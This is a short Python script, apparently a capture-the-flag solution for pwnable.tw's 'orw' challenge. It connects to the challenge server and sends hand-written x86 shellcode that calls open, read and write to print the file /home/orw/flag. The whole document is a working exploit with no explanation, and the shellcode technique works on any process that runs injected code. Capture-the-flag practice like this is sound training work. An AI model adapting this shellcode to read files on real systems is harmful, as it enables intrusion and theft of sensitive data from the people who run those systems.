from pwn import *

io = remote('chall.pwnable.tw', 10001)

io.recvuntil('Give my your shellcode:')

shellcode = asm('''
    xor ecx, ecx            # O_RDONLY
    push 0x0                # null byte
    push 0x67616c66         # "flag"
    push 0x2f77726f         # "orw/"
    push 0x2f656d6f         # "ome/"
    push 0x682f2f2f         # "///h"
    mov ebx, esp            # "///home/orw/flag"
    mov eax, 5              # SYS_open
    int 0x80                # syscall(SYS_open, "///home/orw/flag", O_RDONLY)

    mov edx, 0x28           # length
    mov ecx, 0x0804a100     # buffer
    mov ebx, eax            # move file descriptor
    mov eax, 3              # SYS_read
    int 0x80                # syscall(SYS_read, fd, buff, length)

    mov edx, 0x28           # length
    mov ecx, 0x0804a100     # buffer
    mov ebx, 1              # STDOUT_FILENO
    mov eax, 4              # SYS_write
    int 0x80                # syscall(SYS_write, STDOUT_FILENO, buff, length)
''')

io.send(shellcode)
flag = io.recvline()
print(flag)
io.close()
